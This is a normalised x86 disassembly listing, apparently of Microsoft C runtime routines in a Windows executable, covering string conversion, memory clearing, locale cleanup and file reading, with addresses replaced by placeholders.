mov eax [ ebp - 0x1c ]
call sub_403d95
retn
mov esi edi
mov eax [ rw-data ]
cmp [ eax + esi * 4 ] ebx
je r-xdata
inc edi
jmp r-xdata
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
cmp edi 0x14
jl r-xdata
push eax
call sub_40bdef
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ eax + esi * 4 ]
call sub_405311
pop ecx
mov eax [ rw-data ]
mov [ eax + esi * 4 ] ebx
inc [ ebp - 0x1c ]
sub_40aa47
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test eax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push esi
call sub_408b66
pop ecx
push eax
call sub_40883e
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_40aaaf
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_40aa47
pop ecx
test eax eax
je r-xdata
push esi
call sub_40aaf7
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_408b66
push eax
call sub_40be63
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_40aaf7
push 0x14
push r--data
call sub_403d50
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x24 ] edi
push 0x1
call sub_407a6d
pop ecx
mov [ ebp - 0x4 ] edi
xor esi esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40abc8
cmp [ ebp + 0x8 ] 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] edi
je r-xdata
call sub_403d95
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_408ac9
pop ecx
pop ecx
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov [ ebp - 0x4 ] edi
call sub_40ab99
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
push eax
call sub_40aaaf
pop ecx
cmp eax 0xffffffff
je r-xdata
test cl 0x2
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_40aaaf
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_40abda
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x18 ]
push ebx
xor ebx ebx
push esi
push edi
cmp edx ebx
jle r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x24 ] ebx
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx edx
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x28 ] ebx
push ebx
push ebx
push [ ebp + 0x18 ]
setne al
push [ ebp + 0x14 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x24 ]
call esi
mov edi eax
mov [ ebp - 0x10 ] edi
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x24 ] eax
mov eax edx
sub eax ecx
dec eax
cmp eax edx
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x18 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x1c ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4030d9
leave
retn
push edi
push [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push 0x1
push [ ebp + 0x24 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp - 0xc ]
call sub_40a623
mov eax [ ebp - 0x8 ]
pop ecx
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
push eax
call sub_407637
pop ecx
cmp eax ebx
je r-xdata
call sub_40bd20
mov eax esp
cmp eax ebx
je r-xdata
mov ecx 0x400
test [ ebp + 0x10 ] ecx
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
mov edi [ ebp - 0x8 ]
cmp edi ebx
jle r-xdata
mov eax [ ebp + 0x20 ]
cmp eax ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
cmp [ ebp - 0x8 ] eax
jg r-xdata
push [ ebp - 0x8 ]
push edi
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax ecx
ja r-xdata
push eax
push [ ebp + 0x1c ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
jmp r-xdata
push edi
call sub_40a623
pop ecx
push ebx
push ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
push eax
call sub_407637
pop ecx
cmp eax ebx
je r-xdata
call sub_40bd20
mov edi esp
cmp edi ebx
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ebx
push ebx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push edi
push ebx
push [ ebp + 0x24 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp edi ebx
je r-xdata
sub_40adc1
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_404172
push [ ebp + 0x28 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_40abda
add esp 0x24
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_40ae07
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x1c ]
call esi
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
jle r-xdata
xor eax eax
jmp r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4030d9
leave
retn
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_409820
add esp 0xc
push edi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_40a623
mov eax [ ebp - 0x8 ]
pop ecx
push [ ebp + 0x18 ]
push eax
push ebx
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_407637
pop ecx
cmp eax ebx
je r-xdata
call sub_40bd20
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_40aeee
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_404172
push [ ebp + 0x24 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_40ae07
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_40af2e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_405311
push [ esi + 0x8 ]
call sub_405311
push [ esi + 0xc ]
call sub_405311
push [ esi + 0x10 ]
call sub_405311
push [ esi + 0x14 ]
call sub_405311
push [ esi + 0x18 ]
call sub_405311
push [ esi ]
call sub_405311
push [ esi + 0x20 ]
call sub_405311
push [ esi + 0x24 ]
call sub_405311
push [ esi + 0x28 ]
call sub_405311
push [ esi + 0x2c ]
call sub_405311
push [ esi + 0x30 ]
call sub_405311
push [ esi + 0x34 ]
call sub_405311
push [ esi + 0x1c ]
call sub_405311
push [ esi + 0x38 ]
call sub_405311
push [ esi + 0x3c ]
call sub_405311
add esp 0x40
push [ esi + 0x40 ]
call sub_405311
push [ esi + 0x44 ]
call sub_405311
push [ esi + 0x48 ]
call sub_405311
push [ esi + 0x4c ]
call sub_405311
push [ esi + 0x50 ]
call sub_405311
push [ esi + 0x54 ]
call sub_405311
push [ esi + 0x58 ]
call sub_405311
push [ esi + 0x5c ]
call sub_405311
push [ esi + 0x60 ]
call sub_405311
push [ esi + 0x64 ]
call sub_405311
push [ esi + 0x68 ]
call sub_405311
push [ esi + 0x6c ]
call sub_405311
push [ esi + 0x70 ]
call sub_405311
push [ esi + 0x74 ]
call sub_405311
push [ esi + 0x78 ]
call sub_405311
push [ esi + 0x7c ]
call sub_405311
add esp 0x40
push [ esi + 0x80 ]
call sub_405311
push [ esi + 0x84 ]
call sub_405311
push [ esi + 0x88 ]
call sub_405311
push [ esi + 0x8c ]
call sub_405311
push [ esi + 0x90 ]
call sub_405311
push [ esi + 0x94 ]
call sub_405311
push [ esi + 0x98 ]
call sub_405311
push [ esi + 0x9c ]
call sub_405311
push [ esi + 0xa0 ]
call sub_405311
push [ esi + 0xa4 ]
call sub_405311
push [ esi + 0xa8 ]
call sub_405311
push [ esi + 0xbc ]
call sub_405311
push [ esi + 0xc0 ]
call sub_405311
push [ esi + 0xc4 ]
call sub_405311
push [ esi + 0xc8 ]
call sub_405311
push [ esi + 0xcc ]
call sub_405311
add esp 0x40
push [ esi + 0xd0 ]
call sub_405311
push [ esi + 0xb8 ]
call sub_405311
push [ esi + 0xd8 ]
call sub_405311
push [ esi + 0xdc ]
call sub_405311
push [ esi + 0xe0 ]
call sub_405311
push [ esi + 0xe4 ]
call sub_405311
push [ esi + 0xe8 ]
call sub_405311
push [ esi + 0xec ]
call sub_405311
push [ esi + 0xd4 ]
call sub_405311
push [ esi + 0xf0 ]
call sub_405311
push [ esi + 0xf4 ]
call sub_405311
push [ esi + 0xf8 ]
call sub_405311
push [ esi + 0xfc ]
call sub_405311
push [ esi + 0x100 ]
call sub_405311
push [ esi + 0x104 ]
call sub_405311
push [ esi + 0x108 ]
call sub_405311
add esp 0x40
push [ esi + 0x10c ]
call sub_405311
push [ esi + 0x110 ]
call sub_405311
push [ esi + 0x114 ]
call sub_405311
push [ esi + 0x118 ]
call sub_405311
push [ esi + 0x11c ]
call sub_405311
push [ esi + 0x120 ]
call sub_405311
push [ esi + 0x124 ]
call sub_405311
push [ esi + 0x128 ]
call sub_405311
push [ esi + 0x12c ]
call sub_405311
push [ esi + 0x130 ]
call sub_405311
push [ esi + 0x134 ]
call sub_405311
push [ esi + 0x138 ]
call sub_405311
push [ esi + 0x13c ]
call sub_405311
push [ esi + 0x140 ]
call sub_405311
push [ esi + 0x144 ]
call sub_405311
push [ esi + 0x148 ]
call sub_405311
add esp 0x40
push [ esi + 0x14c ]
call sub_405311
push [ esi + 0x150 ]
call sub_405311
push [ esi + 0x154 ]
call sub_405311
push [ esi + 0x158 ]
call sub_405311
push [ esi + 0x15c ]
call sub_405311
push [ esi + 0x160 ]
call sub_405311
add esp 0x18
sub_40b2a5
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_405311
pop ecx
mov eax [ esi + 0x8 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_405311
pop ecx
mov eax [ esi + 0x30 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_405311
pop ecx
mov esi [ esi + 0x34 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_405311
pop ecx
push esi
call sub_405311
pop ecx
sub_40b30e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_405311
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_405311
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_405311
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_405311
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_405311
pop ecx
mov eax [ esi + 0x24 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_405311
pop ecx
mov eax [ esi + 0x38 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_405311
pop ecx
mov eax [ esi + 0x3c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_405311
pop ecx
mov eax [ esi + 0x40 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_405311
pop ecx
mov eax [ esi + 0x44 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_405311
pop ecx
mov eax [ esi + 0x48 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_405311
pop ecx
mov esi [ esi + 0x4c ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_405311
pop ecx
push esi
call sub_405311
pop ecx
sub_40b40c
pxor xmm0 xmm0
push ecx
push ebx
mov eax ecx
and eax 0xf
test eax eax
jne r-xdata
mov ebx eax
neg ebx
add ebx 0x10
sub edx ebx
xor eax eax
push edx
mov edx ebx
and edx 0x3
je r-xdata
mov eax edx
and edx 0x7f
shr eax 0x7
je r-xdata
shr ebx 0x2
je r-xdata
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
test edx edx
je r-xdata
lea esp [ esp ]
pop edx
jmp r-xdata
mov [ ecx ] eax
lea ecx [ ecx + 0x4 ]
dec ebx
jne r-xdata
pop ebx
pop eax
retn
mov eax edx
shr eax 0x4
je r-xdata
movdqa [ ecx ] xmm0
movdqa [ ecx + 0x10 ] xmm0
movdqa [ ecx + 0x20 ] xmm0
movdqa [ ecx + 0x30 ] xmm0
movdqa [ ecx + 0x40 ] xmm0
movdqa [ ecx + 0x50 ] xmm0
movdqa [ ecx + 0x60 ] xmm0
movdqa [ ecx + 0x70 ] xmm0
lea ecx [ ecx + 0x80 ]
dec eax
jne r-xdata
and edx 0xf
je r-xdata
jmp r-xdata
mov eax edx
xor ebx ebx
shr edx 0x2
je r-xdata
movdqa [ ecx ] xmm0
lea ecx [ ecx + 0x10 ]
dec eax
jne r-xdata
and eax 0x3
je r-xdata
mov [ ecx ] ebx
lea ecx [ ecx + 0x4 ]
dec edx
jne r-xdata
mov [ ecx ] bl
inc ecx
dec eax
jne r-xdata
sub_40b4e0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_40b530
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_40b673
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
mov edx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push 0xfffffffe
pop eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x1c ] edx
cmp esi eax
jne r-xdata
push ebx
xor ebx ebx
cmp esi ebx
jl r-xdata
call sub_405085
and [ eax ] 0x0
call sub_405072
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_405085
mov [ eax ] ebx
call sub_405072
mov [ eax ] 0x9
call sub_405020
or eax 0xffffffff
jmp r-xdata
cmp esi [ rw-data ]
jb r-xdata
pop esi
leave
retn
pop ebx
mov eax esi
sar eax 0x5
push edi
and esi 0x1f
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
shl esi 0x6
mov cl [ eax + esi + 0x4 ]
test cl 0x1
jne r-xdata
cmp edx 0x7fffffff
ja r-xdata
call sub_405085
mov [ eax ] ebx
call sub_405072
mov [ eax ] 0x9
jmp r-xdata
call sub_405085
mov [ eax ] ebx
call sub_405072
mov [ eax ] 0x16
mov [ ebp - 0xc ] ebx
cmp edx ebx
je r-xdata
call sub_405020
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
test cl 0x2
jne r-xdata
pop edi
cmp [ ebp + 0xc ] ebx
je r-xdata
mov al [ eax + esi + 0x24 ]
add al al
sar al 0x1
mov [ ebp - 0x2 ] al
movsx eax al
dec eax
push 0x4
pop ecx
je r-xdata
mov eax edx
not eax
test al 0x1
jne r-xdata
dec eax
jne r-xdata
mov eax edx
shr eax 0x1
mov [ ebp + 0x10 ] ecx
cmp eax ecx
jb r-xdata
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x10 ] ebx
jmp r-xdata
mov eax edx
not eax
test al 0x1
je r-xdata
push [ ebp + 0x10 ]
call sub_4038f8
mov ebx eax
pop ecx
mov [ ebp - 0x10 ] ebx
test ebx ebx
jne r-xdata
mov [ ebp + 0x10 ] eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
mov eax ebx
je r-xdata
and edx 0xfffffffe
mov [ ebp + 0x10 ] edx
push 0x1
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_407fd2
mov ecx [ edi ]
mov [ esi + ecx + 0x28 ] eax
add esp 0x10
mov [ esi + ecx + 0x2c ] edx
call sub_405072
mov [ eax ] 0xc
call sub_405085
mov [ eax ] 0x8
push 0x0
lea ecx [ ebp - 0x18 ]
push ecx
push [ ebp + 0x10 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov cl [ ecx + 0x5 ]
cmp cl 0xa
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
mov ecx [ ebp - 0x18 ]
test ecx ecx
js r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp eax 0x6d
jne r-xdata
call sub_405072
mov [ eax ] 0x9
call sub_405085
mov [ eax ] esi
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
ja r-xdata
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x0
mov [ ebx ] cl
mov ecx [ edi ]
lea eax [ ebx + 0x1 ]
mov [ ebp - 0xc ] 0x1
mov [ esi + ecx + 0x5 ] 0xa
je r-xdata
push eax
call sub_405098
pop ecx
and [ ebp - 0x14 ] 0x0
jmp r-xdata
or [ ebp - 0x14 ] 0xffffffff
mov eax [ edi ]
add [ ebp - 0xc ] ecx
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x80
je r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x25 ]
cmp cl 0xa
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax 0xfffffffe
jne r-xdata
push eax
call sub_405311
pop ecx
mov eax [ ebp - 0x10 ]
cmp eax [ ebp + 0xc ]
je r-xdata
cmp [ ebp - 0x2 ] 0x2
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
je r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0xc ] 0x2
mov [ esi + ecx + 0x25 ] 0xa
jne r-xdata
and [ eax ] 0xfb
cmp [ ebx ] 0xa
jne r-xdata
and [ eax ] 0xfb
cmp [ ebx ] 0xa
jne r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x26 ]
cmp cl 0xa
je r-xdata
sub ebx [ ebp - 0x10 ]
mov [ ebp - 0xc ] ebx
jmp r-xdata
mov eax [ ebp + 0x10 ]
movzx ecx [ eax ]
cmp ecx 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
mov eax ebx
sub eax [ ebp - 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0xc ] eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ecx ]
cmp al 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx [ edi ]
lea esi [ esi + ecx + 0x4 ]
test [ esi ] 0x40
jne r-xdata
cmp ecx 0xd
je r-xdata
mov ebx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0xc ] eax
cmp ebx eax
jae r-xdata
test eax eax
je r-xdata
mov eax [ edi ]
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov ebx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0xc ] eax
cmp ebx eax
jae r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0xc ] 0x3
mov [ esi + ecx + 0x26 ] 0xa
mov ax [ eax ]
mov [ ebx ] ax
add ebx 0x2
or [ esi ] 0x2
jmp r-xdata
mov ecx [ ebp - 0xc ]
add ecx 0xfffffffe
cmp eax ecx
jae r-xdata
mov [ ebx ] cx
add ebx 0x2
add eax 0x2
mov [ ebp + 0x10 ] eax
jmp r-xdata
dec ebx
mov cl [ ebx ]
test cl cl
js r-xdata
mov al [ ecx ]
mov [ ebx ] al
inc ebx
or [ eax ] 0x2
jmp r-xdata
mov eax [ ebp - 0xc ]
dec eax
cmp ecx eax
jae r-xdata
mov [ ebx ] al
inc ebx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add [ ebp + 0x10 ] 0x2
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x2
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea ecx [ eax + 0x2 ]
cmp [ ecx ] 0xa
jne r-xdata
mov eax [ ebp - 0xc ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
xor eax eax
inc eax
movzx ecx cl
jmp r-xdata
inc ebx
jmp r-xdata
inc [ ebp + 0x10 ]
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea eax [ ebp - 0x1 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea eax [ ecx + 0x1 ]
cmp [ eax ] 0xa
jne r-xdata
mov eax [ ebp - 0xc ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add eax 0x4
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ecx + rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
sub ebx [ ebp - 0x10 ]
shr eax 0x1
push eax
push [ ebp + 0xc ]
push ebx
push [ ebp - 0x10 ]
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0xc ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] eax
jmp r-xdata
add ecx 0x2
mov [ ebp + 0x10 ] ecx
jmp r-xdata
push 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
pop eax
mov [ ebx ] ax
cmp eax 0x4
jg r-xdata
mov dl [ ebx ]
movzx ecx dl
movsx ecx [ ecx + rw-data ]
test ecx ecx
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ edi ]
xor ecx ecx
cmp eax ebx
setne cl
add eax eax
mov [ ebp - 0xc ] eax
mov [ esi + edx + 0x30 ] ecx
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebx ] 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
inc ebx
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp ebx [ ebp - 0x10 ]
jb r-xdata
inc ecx
cmp ecx eax
jne r-xdata
call sub_405072
mov [ eax ] 0x2a
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
push 0x1
push 0xffffffff
push 0xfffffffe
push [ ebp + 0x8 ]
call sub_407fd2
add esp 0x10
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
push 0xa
jmp r-xdata
push 0xd
pop eax
mov [ ebx ] ax
mov eax [ edi ]
mov cl [ ebp - 0x8 ]
mov [ esi + eax + 0x5 ] cl
mov eax [ edi ]
mov cl [ ebp - 0x7 ]
mov [ esi + eax + 0x25 ] cl
mov eax [ edi ]
mov [ esi + eax + 0x26 ] 0xa
jmp r-xdata
dec ebx
movzx ecx [ ebx ]
inc eax
mov ecx [ edi ]
test [ ecx + esi + 0x4 ] 0x48
je r-xdata
add ebx eax
jmp r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push [ ebp + 0x8 ]
call sub_407fd2
add esp 0x10
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
mov [ ebx ] 0xa
jmp r-xdata
mov [ ebx ] 0xd
mov eax [ edi ]
mov cl [ ebp - 0x1 ]
mov [ esi + eax + 0x5 ] cl
jmp r-xdata
add ebx 0x2
neg eax
cdq
push 0x1
push edx
push eax
push [ ebp + 0x8 ]
call sub_407fd2
add esp 0x10
inc ebx
mov [ ecx + esi + 0x5 ] dl
cmp eax 0x2
jl r-xdata
cmp eax 0x3
jne r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x25 ] dl
inc ebx
sub ebx eax
